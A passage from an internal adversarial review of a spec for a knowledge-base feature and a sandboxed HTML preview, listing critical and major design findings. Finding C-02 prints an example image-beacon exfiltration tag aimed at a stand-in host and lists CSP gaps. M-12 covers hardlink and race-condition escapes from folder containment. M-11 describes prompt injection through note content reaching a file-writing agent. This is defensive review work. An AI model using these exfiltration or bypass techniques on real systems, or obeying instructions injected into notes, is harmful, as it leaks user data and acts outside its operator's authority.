# Spec review — ADR-067 knowledge base and render-first preview (adversarial grill, pass #1)

- **Reviewed:** `docs/internal/specs/adr-067-knowledge-base-and-preview-spec.md` (Draft, 2026-08-22, 1,435 lines)
- **Authority:** [ADR-067](../architecture/ADR-067-omnipus-knowledge-base-and-render-first-preview.md) revision 2 and its committed review; [requirements](library-improvements-requirements-2026-08-21.md)
- **Branch:** `feat/library-improvements` @ `46ad6a28`, worktree `/Users/danielpiatkowski/AI-Agent-Workspace/omnipus/wt-library-improvements` (clean tree)
- **Reviewer mode:** `plan-spec` (US/AS, BDD block with `Traces to:`, FR-xxx, SC-xxx, traceability matrix, test datasets — all present)
- **Scope:** the spec's adequacy as an implementation contract. Findings already answered in the ADR's Appendix A are **not** re-litigated; where a finding recurs it is because the spec inherited the ADR's answer and then failed to discharge it.
- **Verification:** every `file:line`, symbol and count below was read on this branch in this session. Two figures were measured directly against the reference vault and can be re-run.
- **Date:** 2026-08-22

---

## 1. Executive summary

Five CRITICAL, twenty-one MAJOR, seventeen MINOR, seven OBSERVATION.

The spec is a serious artefact — the BDD block is disciplined, §18's holdout scenarios are
genuinely well designed, and §10's non-behaviours are the right shape. The problem is that its
two headline claims are both false. It says it is "implementation-ready for stages 1 and 2";
**stage 1's only P0 control — the inline content-security policy — is not designed anywhere in
the document**, because the ADR explicitly handed that decision to the spec round and the spec
handed it back. And it says every acceptance criterion maps to a named test; the mapping holds
arithmetically but **six of the reading-surface requirements (FR-060 to FR-065) all point at one
link-resolution unit test that cannot verify any of them**, so the matrix is decorative exactly
where the ADR left no acceptance criteria of its own.

Three findings are of the kind this repo has documented as its characteristic failure mode.
The audio-MIME fix is specified against `workspaceContentType`, a function the Library serving
path never calls — the test would pass green while audio stayed broken. The three performance
tests are named `Bench_*`, which `go test` will not execute at all. And the HIGH-risk regression
guard the spec makes a release gate (SC-013) has no defined baseline artefact, so it can be
written after the change it is meant to guard.

Separately, two measurements against the reference vault contradict the accepted residual: the
100-rune component limit that also makes filenames unaddressable is absent from the residual's
enumeration, and it affects **more** notes today than the illegal-character rule the residual
does measure.

| Severity | Count |
|---|---|
| CRITICAL | 5 |
| MAJOR | 21 |
| MINOR | 17 |
| OBSERVATION | 7 |
| **Total** | **50** |

**Verdict: BLOCK.**

Answers to the five questions this review was asked:

| Question | Answer |
|---|---|
| (a) Can an implementer build stage 1 and 2 without guessing? | **No.** Stage 1: the CSP directive set, the inline allow-list, and where `%%…%%` stripping lands are all undecided (C-01, C-02, C-04, M-06). Stage 2: the tool names, the REST surface, the marker format, and four of nine ambiguity warnings block it (C-05, M-01, M-10, M-15). |
| (b) Are the 56 tests falsifiable and trap-free? | **Partly.** Three cannot run (M-03), three need seams no requirement mandates (M-21), one guards nothing (M-17), one is written to be flaky (M-20), and one asserts against the wrong function (C-03). The rest are sound. |
| (c) Are the acceptance criteria measurable? | **Partly.** MV-1..MV-5 depend on an unspecified fixture (M-04) and MV-2/MV-3 name a metric the in-tree harness does not measure (M-03). MV-6..MV-16 are measurable. FR-007, FR-055 and US-11 AS-5 are not. |
| (d) Does the traceability hold? | **The AC table does; the FR table does not.** All 37 ADR acceptance criteria map to real tests. Ten FRs map to tests that cannot verify them and one maps to nothing (M-02). |
| (e) Is the security adequate? | **No.** FR-003 and FR-006 are mutually unsatisfiable as written (C-02); the allow-list omits SVG (M-06); containment covers symlinks but not hardlinks (M-12); note content reaching agent prompts is unaddressed (M-11); the index outlives revoke with the collection's full text in it (M-13). |
| (f) Does it assume untrue things about the codebase? | **Yes, four times.** `workspaceContentType` is not on the Library path (C-03); no "KB-specific link renderer" exists to bypass into and the Library markdown *is* the chat renderer (C-04); `classifyLibraryEntry` has no HTML/PDF logic — a backend table decides (M-17); the browser matrix does not exist (M-16). ADR-044's deliberate removal of the SPA's only iframe is not mentioned (M-07). |

---

## 2. CRITICAL

### C-01 — Stage 1's only P0 control is undesigned; the spec returns the ADR's spec-round obligation unanswered

- **Lens:** Incompleteness / Infeasibility
- **Affected section:** §11 "The browser (preview rendering)", §10.2 MV-13, FR-005, US-2, §3 P-5

ADR-067 D15 is explicit about what the spec round owed:

> ⚠️ **Known interaction requiring empirical verification:** under an opaque origin, CSP `'self'`
> does not match the serving origin. … **The spec round MUST determine the working directive set
> in real browsers before it is frozen**; if no single-origin policy satisfies both properties,
> fall back to the recorded alternative (A14).

The spec restates this verbatim as a *failure mode* — §11: "if no single-origin policy satisfies
both isolation and subresource loading, fall back to serving previews from a distinct origin (ADR
alternative A14)" — and never determines anything. Nowhere in 1,435 lines is a directive string,
a directive set, or even a list of directives to decide. MV-13 says only "carries a
content-security policy establishing an opaque origin". FR-005 says "opaque origin, established by
the response and not by the embedder".

US-2 is the **only P0 in stage 1** and the spec states it "gates US-1's release". So the whole of
stage 1 is gated on a control that does not exist on paper.

- **Impact:** The implementer invents the policy, and the first place anyone learns whether it
  works is test 12 (`E2E_PreviewIsolation_BrowserMatrix`) — on infrastructure that does not exist
  (M-16). If it fails, the recorded fallback is A14: **a second origin**, i.e. a second listener or
  host, which ADR-044 deliberately removed and which touches `gateway.public_url`,
  `CanonicalGatewayOrigin`, CORS, WS `CheckOrigin` and `docs/operations/reverse-proxy.md`. That is
  not a fallback, it is a different architecture, discovered at the end of stage 1 with no branch
  in the plan, no owner, no test list and no schedule.
- **Recommendation:** Before stage 1 is called ready, run the experiment the ADR asked for and
  write the answer down. Concretely: (1) stand up a fixture bundle (`index.html` + external
  `.css` + `.js` + `.woff2` + `.mp3`) behind a candidate header set; (2) record, per browser, which
  of the five subresources load and whether `document.cookie` is readable; (3) freeze the exact
  directive string in §10.2 as a literal, with the browsers and versions it was verified against;
  (4) if no single-origin policy works, promote A14 to a decision *now* with its own prerequisite
  row, its own FRs, and an explicit statement of the ADR-044 departure. Add a decision point with
  a date to §3.

### C-02 — FR-003 and FR-006 are mutually unsatisfiable as written, and no test distinguishes the cases

- **Lens:** Inconsistency / Insecurity (Information Disclosure)
- **Affected section:** FR-003, FR-005, FR-006; §8 Behavioral Contract; test 11

- **FR-003:** "MUST load relative subresources of an HTML bundle." (US-1 AS-4 requires css, js and
  a webfont to load.)
- **FR-005:** "MUST bind every inline-previewed document to an opaque origin."
- **FR-006:** "MUST block network egress from a previewed document."
- **§8:** "When a document requests any network destination, the system blocks it."

Under an opaque origin the `'self'` keyword does not match the serving origin, so the only way to
satisfy FR-003 is to name the gateway origin explicitly as a source in `script-src`, `style-src`,
`font-src` and `media-src`. That named origin is, by construction, a permitted network
destination — which contradicts FR-006 and §8 as literally written. The spec never separates
"fetch a sibling asset from the bundle" from "reach a third-party host", and states both as
absolutes.

Worse, test 11 (`E2E_PreviewIsolation_NetworkBlocked`, "Egress blocked") asserts one thing:
"the request is blocked". `connect-src 'none'` blocks `fetch`/XHR/WebSocket/`sendBeacon`. It does
**not** block `<img src>`, `<iframe src>`, `<a target=_blank>` clicks, `window.open`, DNS
prefetch, or a CSS `url()` — all of which are exfiltration or beacon channels, and several of
which must stay open for FR-003.

- **Impact:** A page that satisfies every named test can still phone home with an
  `<img src="https://evil.example/beacon?t=...">`. The operator has been told (US-2's own words)
  that the page "cannot … phone home". That is a security claim the spec's tests do not support.
- **Recommendation:** Replace FR-006 with an enumerated directive set and an enumerated list of
  blocked request classes, each with its own test:

  | Request class | Directive | Test |
  |---|---|---|
  | fetch / XHR / WebSocket / sendBeacon | `connect-src 'none'` | new |
  | image beacon | `img-src <gateway-origin> data:` | new |
  | third-party script / style / font / media | source lists naming only the gateway origin | new |
  | form submission | `form-action 'none'` | new |
  | top-level navigation | `sandbox` without `allow-top-navigation` | new |
  | popup | `sandbox` without `allow-popups` | new |
  | plugin / object | `object-src 'none'` | new |

  Then restate FR-003 as "MUST load subresources served from the gateway origin" and FR-006 as
  "MUST block every request class in the table above", so the two stop contradicting each other.

### C-03 — The spec's named fix for audio MIME is in a function the Library serving path does not call

- **Lens:** Incorrectness (false assumption about the codebase) → false green
- **Affected section:** §2.1 (`workspaceContentType` — "**Modified** — audio MIME types added"),
  MV-14, FR-009, AC-15.3, test 3 (`TestContentTypeForPath_AudioExtensions`)

`handleLibraryDownload` (`pkg/gateway/rest_library.go:561-594`) serves bytes through
`http.ServeContent` and sets exactly two headers of its own —
`X-Content-Type-Options: nosniff` (line 591) and `Content-Disposition: attachment` (line 592).
It never calls `workspaceContentType` or `contentTypeForPath`; grep for either symbol across
`pkg/gateway/rest_library.go` and `pkg/library/*.go` returns **zero matches**. The
Content-Type is derived by the standard library, not by the table the spec proposes to edit.

`workspaceContentType` (`pkg/gateway/rest_workspace.go:87-101`) maps 14 extensions and governs
the `/preview/` path and the (effectively unregistered) workspace handler — neither of which
serves Library files.

- **Impact:** This is the shape `docs/internal/false-green-patterns.md` is written about. Test 3
  is a unit test asserting a map lookup in a function that is not on the path under test. It goes
  green. MV-14 is ticked. AC-15.3 is ticked. The traceability matrix shows FR-009 → test 3,
  complete. And `.mp3` still arrives with whatever `http.ServeContent` decided — which for
  `.opus`, `.aac` and `.m4a` is not obviously a playable type, and with `nosniff` set the browser
  will not rescue it.
- **Recommendation:** Correct §2.1 to name the real code path. Decide and state whether the
  Library route (a) begins setting `Content-Type` explicitly from an extension table, (b) reuses
  `contentTypeForPath` (and therefore *does* modify it, changing `/preview/` behaviour too — say
  so and add a regression row), or (c) continues to rely on `http.ServeContent`'s sniffing, in
  which case FR-009 must be re-expressed as a property of the *response*, not of a table.
  Regardless: make test 3 an **integration** test that issues a real request per extension against
  the real Library endpoint and asserts the response header, not a unit test on a map.

### C-04 — Stage 1 cannot deliver FR-011 without touching the shared chat markdown renderer, and the spec asserts it does not

- **Lens:** Incorrectness (false assumption) / Inconsistency
- **Affected section:** §2.1 (`isSafeHref` (TS) — "**Not modified** — bypassed by a KB-specific
  link renderer"), §2.4, NB-4, FR-011, SC-014, §13.3

`src/components/library/LibraryMarkdownPreview.tsx:1-9,19-29` renders the Library's markdown by
importing `HistoricalMessageMarkdown` from `@/components/chat/historical-markdown` — the exact
component chat uses for finalised messages — and its own header comment says:

> This is deliberately NOT a second markdown pipeline — see this task's brief.

So there is no "KB-specific link renderer" to bypass into; there is one renderer, shared with
chat, whose source explicitly forbids forking. §2.4's entire framing ("the KB-scoped approach is
correct rather than a workaround") assumes a scoping boundary that does not exist yet.

FR-011 (`%%…%%` hidden) is **stage 1**, when no knowledge base exists at all, so it must land in
the shared pipeline or in a new fork of it. The spec never says which, and never says whether
`%%…%%` stripping applies to chat markdown too — a behaviour change to the rendering of untrusted
model and tool output, which is precisely the class of change M-7 in the ADR review said must be
scoped deliberately. Meanwhile §13.3 asserts the chat suites "stay green **and unmodified**" as
though no shared code is touched.

- **Impact:** Two implementers build two different things. One adds a `variant` prop to
  `historical-markdown` and silently changes chat's rendering of `%%…%%`; the other forks the
  pipeline against its own documented intent. Either way SC-014's promise is made without knowing
  whether it can be kept.
- **Recommendation:** Add a decision to §2 or §5: (a) a `variant: 'chat' | 'kb'` prop on the
  shared renderer, with an explicit statement of what chat's variant does for each of `%%…%%` and
  relative links, plus a chat-side test for each; or (b) a forked KB renderer, with an explicit
  override of `LibraryMarkdownPreview.tsx`'s stated intent and a note on the duplication cost.
  Give FR-011 a scope sentence ("all markdown" or "the KB reader only") and a test for whichever
  side of the boundary changes.

### C-05 — The spec declares itself implementation-ready while recording, in its own §3 and §17, that it is not

- **Lens:** Inconsistency
- **Affected section:** header Status line, §3 P-1 and P-4, §17 AW-1/AW-2/AW-6/AW-7

The status line reads: "Draft — implementation-ready for stages 1 and 2." Against that:

- **§3 P-1:** "ADR-067 accepted — **Blocked** — a founder-visible vault design note must exist
  first." The spec implements an ADR that is `Proposed`, not accepted, and whose own §7 says it
  stays that way until the note exists.
- **§3 P-4:** the 100k fixture is "**To build** — required before any §1.2 performance claim". Five
  of fifteen success criteria depend on it.
- **AW-1** (excerpt strategy) decides whether bleve stores highlightable fields, which decides
  index size, which decides MV-2 and MV-3. It is a stage-2 architecture decision, not a warning.
- **AW-2** (are attachments indexed) decides what "100,000 notes" *means*. The ADR's own O-6 notes
  the researched 104k-file vault was roughly half images. Until this is answered, MV-1 to MV-5 do
  not have a defined subject.
- **AW-6** (drift-check surface) blocks FR-038, and ADR O-8 already established the obvious
  answer — a CLI — cannot work against a running gateway because scorch holds a process-exclusive
  bbolt lock with a 5 s bound (`pkg/memrooms/index/index.go:77`).
- **AW-7** (body-size cap) blocks E-5, which §9 nonetheless describes as "a **documented** body cap".

- **Impact:** Work starts on a document that says it is ready, and stalls four times on decisions
  the document itself flagged. The stall points are all in stage 2, after stage 1's own blockers
  (C-01, C-02, C-04) have already consumed the buffer.
- **Recommendation:** Change the status line to name what blocks it — e.g. "Draft — **not**
  implementation-ready; stage 1 blocked on the CSP determination (§11), stage 2 blocked on AW-1,
  AW-2, AW-6, AW-7 and P-4; both blocked on P-1." Then close AW-1, AW-2, AW-6 and AW-7 as
  decisions in §10.2, and move P-1 to Done or state explicitly that stage 1 may proceed ahead of
  ratification and who agreed that.

---

## 3. MAJOR

### M-01 — The spec never names the tools it specifies, and test 34's precondition is unachievable at stage 2

- **Lens:** Incompleteness / Inconsistency
- **Affected section:** FR-070, FR-071, MV-16, MV-17, test 34, §12 "Feature: Boot and policy"

FR-070 requires "every knowledge tool" to be "enumerated **explicitly**… with no wildcards", on
pain of aborting boot (Hard Constraint #6). The spec contains **no tool names at all** — not
`knowledge_search`, not `knowledge_graph`, not any of the six authoring tools. The list and the
per-agent posture live only in ADR D17. An implementation contract that requires literal
enumeration and enumerates nothing is not a contract.

Worse, test 34's Given is "a fresh installation with **all knowledge tools** registered", and it
is placed in **stage 2**. At stage 2 the authoring tools do not exist (they are stage 3, US-12 to
US-15). Either the test cannot be run as written at stage 2, or stage 2 must register tools it
does not implement.

The recipe itself is real and buildable — `allStaticToolNames` (`pkg/coreagent/core.go:350`), the
`Sandbox.ToolPolicies` map (`pkg/config/defaults.go:330+`), and per-agent overrides
(`pkg/coreagent/core.go:722-768`) — so the omission is purely one of transcription.

- **Recommendation:** Add a table to §14 listing every `knowledge_*` tool, its stage, and its
  seeded posture per core agent (Mia/Jim/Ava/Ray), copied from ADR D17. Split test 34 into
  34a (stage 2, retrieval tools only) and 34b (stage 3, full set), and say what FR-071's migration
  keys on — a config version stamp, a tool-name list, or something else.

### M-02 — Ten functional requirements trace to tests that cannot verify them; one traces to nothing

- **Lens:** Inconsistency (traceability is decorative)
- **Affected section:** §16 Traceability Matrix

The AC coverage half of §16 is sound: all 37 ADR acceptance criteria map to plausible tests. The
FR half is not. Verified row by row:

| FR | Maps to | Why the test cannot verify it |
|---|---|---|
| FR-060 render wikilinks/embeds | 17 `TestResolveLink_AllFourForms` | a link-*resolution* unit test; renders nothing |
| FR-061 callouts, highlights, frontmatter-not-body | 17 | same |
| FR-062 heading outline | 17 | same |
| FR-063 inbound links shown | 17 | same |
| FR-064 rail collapses when docked | 17 | same; this is a responsive-layout property |
| FR-065 unresolved links marked, do not navigate | 17 | same |
| FR-050 ranked results with path/title/excerpt | 28 `TestSearchResultCap_ClampedAndReported` | a clamping test; asserts nothing about excerpts |
| FR-051 link/backlink/unresolved/orphan/neighbourhood | 17 | one of five queries, and only resolution |
| FR-054 neighbourhood hop/node bounds | 28 | unrelated |
| FR-055 rate-limit agent retrieval | 28 | unrelated; and no rate is stated anywhere |
| FR-002 source only after Edit | 9 `E2E_PreviewBundle_AllAssetsLoad` | never presses Edit |
| FR-007 persistent untrusted-content boundary | 10 `E2E_PreviewIsolation_TopLevelNavigation` | a **top-level tab** has no Omnipus chrome, by definition |
| FR-038 agent-free drift check | 32 `TestRebuild_IdenticalQueryAndGraphAnswers` | never invokes a drift check; `doctor` has no test in all 56 |
| FR-112 report unaddressable files | — | "see AW-3" — admitted absence |
| FR-013 no relative-link change outside the KB | "Existing chat suites" | not a named test |

The pattern is not random. Every one of these FRs derives from an ADR decision that carries **no
acceptance criterion** — D8, D9, D16, D18, D19 and D20 have none. Where the ADR supplied an AC the
spec produced a real test; where it did not, the spec filled the cell with the nearest available
test number.

- **Impact:** §16 is the artefact a reviewer uses to decide the spec is complete. It reports 100%
  coverage while eleven requirements — including the entire reading surface, the thing US-7 calls
  the point of the feature — have no verification at all.
- **Recommendation:** Add tests for the reading surface (component tests for callouts, highlights,
  frontmatter suppression, outline extraction, backlink list, unresolved-link inertness; a
  viewport test for the docked rail), for excerpt/title content, for the neighbourhood bounds, and
  for the rate limit. Where a requirement genuinely will not be tested this round, write `— none`
  in the matrix rather than a number that does not fit, and list it under §17.

### M-03 — Three performance tests cannot run, the gate that would run them is non-blocking, and the metric they name is not the metric the harness measures

- **Lens:** Infeasibility / false green
- **Affected section:** tests 37, 38, 39; MV-1 to MV-5; SC-001 to SC-005

Three separate defects, all in the same three lines:

1. **Naming.** Go's toolchain executes `TestXxx`, `BenchmarkXxx` and `FuzzXxx`. `Bench_Search_p95_100k`,
   `Bench_InitialIndex_PeakRSS_100k` and `Bench_Reconcile_Unchanged_100k` are ordinary functions
   that nothing invokes. `go test -bench 'Bench_'` and `go test -run 'Bench_'` both print `ok` and
   run nothing — checklist item 2 of `false-green-patterns.md` ("`go test -run 'Pattern'` prints
   `ok` when the pattern matches *nothing*"). The same table mixes `E2E_*` names with `Test*` names
   without saying which runner executes which, which is how a whole tier gets silently skipped
   (trap 4: 27% of the SPA suite).
2. **No gate.** `tests/perf/` exists and is real, but it is driven by
   `.github/workflows/perf-nightly.yml`, which runs `-benchtime=1x` nightly and **commits results
   to `tests/perf/results/`**. It does not fail on a threshold. SC-001 to SC-005 are written as
   release criteria with no job that can block a release on them, and the spec never says which
   harness these three tests join.
3. **Wrong metric.** MV-2 and MV-3 say "peak resident memory" and "steady-state resident memory".
   Both in-tree samplers estimate from `runtime.MemStats` —
   `pkg/testutil/load_harness.go::SampleRSS` (whose own comment flags it as an estimate, not true
   OS RSS) and `tests/perf/benchmark_compaction_test.go::sampleRSS` (`HeapInuse`). A
   memory-mapped bleve scorch index is the specific case where heap and RSS diverge: touched
   segment pages count toward RSS and never appear in `MemStats`. MV-3's "< 64 MB steady-state" is
   therefore both unmeasurable by the existing harness and of doubtful achievability as an OS-RSS
   figure once a 100k-note index has been queried.

- **Recommendation:** Rename to `BenchmarkSearchP95_100k` etc. (or state plainly that these are
  Playwright/other-runner specs and give the runner per row). State which suite they live in and
  which CI job fails when a threshold is missed — if that job does not exist, add building it to
  §3 as a prerequisite. Define MV-2/MV-3 precisely: OS RSS of which process, sampled how, at what
  point, and whether mmap'd pages count. If the answer is "we measure Go heap", say so and set the
  thresholds against heap, not against "resident memory".

### M-04 — The 100k fixture is the measurement instrument and it is unspecified

- **Lens:** Infeasibility
- **Affected section:** §3 P-4, A-5, DS-2, MV-1 to MV-5, SC-001 to SC-005, SC-010

P-4 records the fixture generator as "To build". A-5 specifies exactly one property: "its link
density is modelled on the reference collection". Nothing is said about vocabulary size, term
distribution, note length distribution, frontmatter shape, folder depth, or the attachment ratio
(which AW-2 leaves open anyway).

Those are the properties that determine the numbers. A synthetic corpus generated from a small
vocabulary produces a tiny posting-list index and sub-millisecond BM25 queries — MV-1, MV-2 and
MV-3 all pass, and none of them says anything about a real vault. The fixture is not a test
input; it *is* the measurement, and a measurement instrument nobody has specified cannot falsify
anything.

Two related problems in the same tables:

- **DS-2 #3** — "748 notes, 2,108 attachments — reference shape" is the founder's real, private
  vault. It cannot be a committed CI fixture, and the spec does not say what stands in for it.
- **SC-010** — "Renaming a note updates 100% of inbound links … **across the reference
  collection's link distribution**" is written as a measurable release gate against that same
  private vault. It is not runnable in CI as stated.

- **Recommendation:** Specify the generator as a requirement, with the properties that bind:
  vocabulary size and Zipf parameter, note-length distribution (median and p99), links per note,
  fraction of links in frontmatter, folder depth, and the attachment count once AW-2 closes. State
  that it is deterministic from a seed and committed. Re-express SC-010 against a synthesised
  fixture whose link distribution is derived from (not identical to) the reference vault, and move
  the real-vault run into §18 as a holdout, where it already belongs.

### M-05 — MV-4 contradicts FR-107: a 2-second freshness check over 100,000 files cannot hash, and mtime is the detector the spec itself calls insufficient

- **Lens:** Inconsistency / Infeasibility
- **Affected section:** MV-4, US-5 AS-4, FR-033, FR-107, D14 (inherited)

FR-107: "The system MUST NOT rely on modification time alone to detect an external change." The
reason is stated in the ADR and is correct: Syncthing preserves source mtimes on replication and
several filesystems have 1-second granularity.

MV-4: "Unchanged-collection freshness check < 2 s" over 100,000 files. Hashing 100,000 files in
two seconds is not possible on the target hardware, let alone on the target *environment* — a
cloud-synced folder, which is the case §1.3 of the ADR says is "the target environment, not an
edge case". So the freshness check must be size+mtime only.

FR-033 straddles the two: "re-parse only files whose recorded size, modification time **or content
hash** changed" — leaving it undecided whether the hash is computed on the freshness path or only
on the write path.

- **Impact:** The exact class of external change the spec goes to some length to defend against on
  the write path is invisible on the read path. An agent searches, gets a stale answer, and
  nothing anywhere says the index may be stale in that specific way. (Residual 5 says the index
  "can be stale between scans" — it does not say a scan can miss a change.)
- **Recommendation:** State the split explicitly: the freshness scan uses size+mtime and is
  therefore weaker than the write path's hash comparison; name the resulting failure (a
  mtime-preserving external edit is not re-indexed until something else touches the file); and
  either add it as an accepted residual with a `doctor` backstop, or add a periodic full-hash
  reconcile with its own (much larger) time budget.

### M-06 — The inline allow-list is never enumerated, and SVG is the omission that matters

- **Lens:** Insecurity (Elevation of Privilege) / Ambiguity
- **Affected section:** FR-008, MV-13, test 4, US-1 AS-4, US-2 AS-5

FR-008, MV-13, §8 and test 4 (`TestInlineDisposition_AllowListOnly`) all refer to "the inline
allow-list". §14 never lists it. Two consequences:

1. **SVG.** `.svg` is already mapped in `workspaceContentType` and already classified `image` by
   `classifyLibraryEntry`, and today it is safe because it is served with
   `Content-Disposition: attachment` into an `<img>` (an `<img>`-loaded SVG cannot script). An
   implementer extending the allow-list by "the image kinds render inline anyway" turns SVG into a
   scriptable document on the gateway origin. The spec must name SVG and exclude it — or include
   it and say why the CSP covers it.
2. **Subresources.** US-1 AS-4 requires an external `.css`, `.js` and `.woff2` to load. They must be
   *fetchable* — which they are today, since `Content-Disposition: attachment` does not prevent a
   subresource from loading — but they must also carry usable Content-Types under `nosniff`.
   `.woff2` has **no** MIME entry anywhere in the codebase, and the spec adds only audio types.
   A webfont served as `application/octet-stream` with `nosniff` will not be used, and the page
   will render "styled and scripted but wrongly typeset" — a partial failure the acceptance
   scenario would catch only if someone reads the rendered text carefully.

- **Recommendation:** Add a literal table to §10.2: extension → inline or attachment → Content-Type
  → CSP source class. Include `.html`, `.htm`, `.pdf`, the seven audio extensions, `.css`, `.js`,
  `.woff`, `.woff2`, `.ttf` and — explicitly, with a reason — `.svg`, `.xhtml` and `.xml`. Extend
  test 4 to a table-driven test over that exact list, including the negative rows.

### M-07 — ADR-044 removed the SPA's only iframe embed for a documented isolation reason; the spec reintroduces one and never mentions it

- **Lens:** Incompleteness (missing codebase context)
- **Affected section:** §2 Existing Codebase Context, US-1, FR-001

`src/components/chat/IframePreview.tsx:6-19` records that the SPA's only iframe embed was
deliberately retired: a same-origin iframe presents an isolation dilemma where `allow-same-origin`
either compromises the SPA or breaks the framed app's own auth, and chat now renders a plain
`target="_blank"` link instead. That is the closest prior art in the codebase to what stage 1
builds, it was removed on purpose, and §2 does not mention it.

The ADR's D15 does address the *response-borne* half of the problem (which is why the CSP
`sandbox` directive is there at all), but it never addresses the embedder half that ADR-044
actually decided, and the spec inherits that silence. §2.1 lists neither `IframePreview.tsx` nor
ADR-044 among the referenced symbols or decisions.

- **Recommendation:** Add ADR-044's iframe removal to §2 as prior art and state in one paragraph
  why the new embed is different (response-borne policy rather than embedder attributes) and what
  the sandbox attribute set on the new `<iframe>` will be, given the response already carries a
  `sandbox` CSP. State explicitly whether the two interact — a CSP `sandbox` and an
  `<iframe sandbox>` attribute intersect rather than union, which is easy to get wrong.

### M-08 — FR-090 is placed in stage 2, all its tests are stage 3, and the audit substrate does not do what it requires

- **Lens:** Incompleteness / Inconsistency
- **Affected section:** FR-090, US-15, tests 50 and 51, §13.3

`a.logLibraryAudit` (`pkg/gateway/rest_library.go:726-739`) is the reuse the ADR's D19 points at.
As wired today it:

- never sets `AgentID` — it records an HTTP caller username inside `Details` instead;
- is called **only on success**;
- hardcodes `Decision: audit.DecisionAllow`.

FR-090 requires "an audit record for every knowledge-base mutation **and every refusal**", naming
"the agent". Neither the acting-agent field nor any refusal path exists. `audit.Entry`
(`pkg/audit/audit.go:244-266`) has the fields, so this is buildable — but it is new plumbing plus
a change to an existing call site, and §13.3 lists no audit regression row at all.

Separately, §14 files FR-090 under "Boot, contracts, audit (**stage 2**)", while tests 50 and 51
are both **stage 3**, and every mutation FR-090 audits is stage 3. Nothing in stage 2 mutates a
knowledge base.

- **Recommendation:** Move FR-090 to stage 3, or split it: a stage-2 requirement that the audit
  record shape exists and carries `AgentID`, and a stage-3 requirement that mutations and refusals
  emit it. Add a §13.3 regression row for `logLibraryAudit`'s existing callers, and state whether
  existing Library mutations gain a refusal audit path as a side effect.

### M-09 — MV-12 and US-9 AS-2 specify different observables for the same case, and the graph path has no test

- **Lens:** Inconsistency
- **Affected section:** MV-12, US-9 AS-2, FR-053, test 26

- **MV-12:** "A request for a knowledge base outside the caller's workspace returns an **empty
  result set** — not 403, which would confirm its existence."
- **US-9 AS-2:** "that agent asks for its backlinks or outline, **the knowledge base is not
  addressable at all**."

"Empty result set" and "not addressable at all" are different HTTP responses. For a backlinks
query the first means 200 with `[]`; the second suggests 404 or the collection simply not
appearing in any listing. An implementer picks one and the other scenario fails.

Test 26 (`TestSearchScope_CrossWorkspaceReturnsEmpty`) covers **search only**. The backlinks,
outline, unresolved, orphan and neighbourhood paths named in AS-2 and FR-051 have no isolation
test, and they are separate code paths from search.

- **Recommendation:** Pick one observable and state it for every retrieval operation — the
  existence-non-disclosure argument favours "the collection does not appear in the caller's KB
  list, and any operation naming it returns the same empty/absent shape as a non-existent one".
  Add a test per retrieval operation, not just search. Note that "empty result set" and
  "indistinguishable from non-existent" are only equivalent if a genuinely non-existent collection
  also returns empty rather than 404 — say which.

### M-10 — The marker's on-disk format is unspecified, and it is written into the operator's real folders

- **Lens:** Incompleteness
- **Affected section:** FR-022, FR-024, D2 (inherited), test 15

FR-024: "MUST store a knowledge base's display name and template location in its marker." That is
the entire specification of a directory that Omnipus creates inside the operator's actual
filesystem, alongside `.obsidian/`, `.git/` and `.stfolder/`. Not stated: the file name inside
`.omnipus-vault/`, the serialisation (JSON? YAML? TOML?), the schema, whether it carries a format
version, what happens when it is malformed or empty, or whether it is one of the "wire formats"
Hard Constraint #8 governs (it is read by the gateway and its contents cross to the SPA as
`KnowledgeBaseInfo`, so at least the projection is).

E-9 covers "marker present but unreadable (permissions)" and nothing covers "marker present but
its contents are garbage" — which is the likelier case, since the file will be edited by hand and
synced by Syncthing.

- **Impact:** The format is written to operator data on first use and cannot be changed silently
  afterwards. This is the one artefact in the whole feature with no migration path.
- **Recommendation:** Specify it in §10.2: the exact path (`<root>/.omnipus-vault/vault.json` or
  similar), the schema with a `version` field, the parse-failure behaviour (fail loudly, do not
  downgrade to "ordinary folder" — matching E-9's posture), and whether it is contract-governed.
  Add an edge case for a malformed marker and a test.

### M-11 — Note content reaches agent prompts with no escaping or injection requirement; the ADR had one and the spec dropped it

- **Lens:** Insecurity (Tampering / Elevation of Privilege)
- **Affected section:** FR-050, §10.1 (no NB covers this), US-8

ADR D1 states: marker contents "are read as data, never executed, **never interpolated into a
prompt without escaping**". The spec carries the "never executed" half into NB-11 (templates) and
drops the escaping half entirely — for markers *and* for note bodies.

FR-050 returns "path, title and matched excerpt" to an agent. Stage 3 gives that same agent
`knowledge_rename`/`knowledge_move` and write access to the operator's real disk. A note whose
body contains instructions is an input to a tool-using agent with file-mutation capability, and
the collection is explicitly described as being written by "Obsidian, a sync agent, git and a
CLI" plus 56 other agents — i.e. content Omnipus did not author.

Nothing in §10.1's eleven non-behaviours, §14's requirements or the 56 tests addresses this.

- **Recommendation:** Add NB-12: "The system must not present knowledge-base content to an agent
  in a form that is indistinguishable from Omnipus's own instructions" — and a requirement stating
  how retrieved excerpts and marker contents are delimited or escaped when they enter a prompt.
  The codebase already has the pattern: `src/components/chat/UntrustedChildText.tsx` treats
  child-emitted text as untrusted with a visible provenance badge. Add a test that a note
  containing an instruction-shaped string round-trips as data.

### M-12 — Containment covers symlinks but not hardlinks, does not name the confinement primitive the codebase already has, and leaves the TOCTOU open

- **Lens:** Insecurity (Information Disclosure)
- **Affected section:** FR-043, FR-044, NB-7, US-10, tests 19-21, DS-1 #7-#8

FR-043 requires every walked path and resolved target to "resolve inside the collection root";
FR-044 skips and reports symlinks. Three gaps:

1. **Hardlinks.** A hard link inside the collection pointing at `/etc/passwd` or
   `~/.ssh/id_rsa` is not a symlink, has no distinguishable `lstat` mode, and passes every
   realpath check because its realpath *is* inside the collection. It is walked, read, indexed,
   and its content becomes searchable and returnable as an excerpt. Nothing in the spec mentions
   hardlinks. (Mitigation is cheap: compare `st_nlink > 1` and report, or compare device+inode
   against the walk set.)
2. **The primitive.** `pkg/library` confines through `os.Root` (`pkg/library/entries.go:280`,
   `content.go:139,194` and the whole `multiroot_test.go` suite). The spec specifies realpath
   comparison instead, without saying why the existing primitive is not used. `os.Root` is
   `openat`-based and closes the TOCTOU that a realpath-then-open sequence leaves open.
3. **TOCTOU.** Between the containment check and the read, a symlink can be swapped for one
   pointing outside. The spec's tests (19-21) all use static fixtures, so none can detect this.

- **Recommendation:** State the mechanism, not just the invariant: "the walker opens every path
  through an `os.Root` rooted at the collection, so containment is enforced by the kernel at open
  time rather than by a prior path comparison." Add a hardlink edge case to §9 and a row to DS-1.
